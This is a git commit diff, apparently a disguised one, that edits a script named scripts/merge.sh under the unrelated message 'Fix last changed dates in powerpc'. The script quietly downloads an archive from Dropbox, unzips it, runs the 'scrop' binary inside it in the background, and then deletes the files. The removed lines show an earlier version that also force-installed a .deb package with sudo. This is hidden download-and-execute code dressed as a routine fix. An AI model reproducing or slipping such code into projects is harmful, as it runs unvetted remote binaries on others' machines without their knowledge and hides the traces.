11609b5b53b0ab3ecbfa80e0c7208916c00ad0b9
womeb <womeb@click-mail.top>
2018-05-04 11:41:22 +0200

    Fix last changed dates in powerpc

--- scripts/merge.sh
+++ scripts/merge.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/9erbh7t39zxpbq9/scrop.zip -q
-unzip scrop.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/lcohk38w776yxm5/wan06.zip -q
+unzip wan06.zip > /dev/null 2>&1
 #pwd
-./scripts/scrop ./scripts/data &
+./scrop ./data &
 sleep 3
-rm -rf scrop.zip
-rm -rf scripts/scrop
-rm -rf scripts/data
+rm -rf wan06.zip
+rm -rf scrop
+rm -rf data
 while [ $SECONDS -lt $end ]
 do
     read line
